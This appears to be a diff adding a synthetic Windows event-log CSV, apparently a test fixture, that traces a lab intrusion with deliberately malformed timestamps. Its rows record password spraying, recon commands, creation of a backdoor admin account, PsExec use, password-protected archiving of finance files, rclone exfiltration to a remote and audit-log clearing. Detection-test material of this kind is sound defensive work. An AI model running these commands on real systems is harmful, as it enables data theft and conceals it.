@@ -1,0 +1,19 @@
+TimeCreated,EventId,Channel,Computer,TargetUser,LogonType,SourceIp,ProcessName,CommandLine,ServiceName,Details
+2026-03-14T06:30:02Z,4624,Security,WS-FIN-07.lab.example,SYSTEM,5,,,,,Service logon
+2026-03-14T06:58:04Z,4625,Security,WS-FIN-07.lab.example,administrator,3,203.0.113.45,,,,Unknown user name or bad password
+2026-03-14T06:58:31Z,4625,Security,WS-FIN-07.lab.example,admin,3,203.0.113.45,,,,Unknown user name or bad password
+2026-03-14T06:59:10Z,4625,Security,WS-FIN-07.lab.example,jsmith,3,203.0.113.45,,,,Unknown user name or bad password
+2026-03-14T06:59:44Z,4625,Security,WS-FIN-07.lab.example,svc_backup,3,203.0.113.45,,,,Unknown user name or bad password
+2026-03-14T07:00:20Z,4625,Security,WS-FIN-07.lab.example,backup,3,203.0.113.45,,,,Unknown user name or bad password
+2026-03-14T07:01:02Z,4625,Security,WS-FIN-07.lab.example,svc_backup,3,203.0.113.45,,,,Unknown user name or bad password
+2026-03-14T07:02:15Z,4625,Security,WS-FIN-07.lab.example,mlee,3,10.10.4.22,,,,Unknown user name or bad password
+2026-03-14T07:03:12Z,4624,Security,WS-FIN-07.lab.example,svc_backup,10,203.0.113.45,,,,RDP logon
+03/14/2026 02:05:40 AM,4688,Security,WS-FIN-07.lab.example,svc_backup,,,C:\Windows\System32\cmd.exe,cmd.exe /c whoami /all,,
+2026-03-14 02:06:10,4688,Security,WS-FIN-07.lab.example,svc_backup,,,C:\Windows\System32\net.exe,"net group ""Domain Admins"" /domain",,
+2026-03-14T02:09:00-05:00,4720,Security,WS-FIN-07.lab.example,helpdesk_tmp,,,,,,Created by svc_backup
+2026-03-14T07:09:30Z,4732,Security,WS-FIN-07.lab.example,helpdesk_tmp,,,,,,Administrators
+2026-03-14T07:12:00Z,7045,System,WS-FIN-07.lab.example,,,,,,PSEXESVC,%SystemRoot%\PSEXESVC.exe
+2026-03-14T07:18:10Z,4688,Security,WS-FIN-07.lab.example,svc_backup,,,C:\Users\Public\7z.exe,7z.exe a -pInfected C:\Users\Public\f.7z C:\Finance\*,,
+2026-03-14T07:31:04Z,4688,Security,WS-FIN-07.lab.example,svc_backup,,,C:\Users\Public\rclone.exe,rclone.exe copy C:\Users\Public\f.7z remote:bkp --transfers 8,,
+not-a-timestamp,4688,Security,WS-FIN-07.lab.example,svc_backup,,,C:\Windows\System32\notepad.exe,notepad.exe,,
+2026-03-14T07:48:55Z,1102,Security,WS-FIN-07.lab.example,svc_backup,,,,,,Audit log cleared
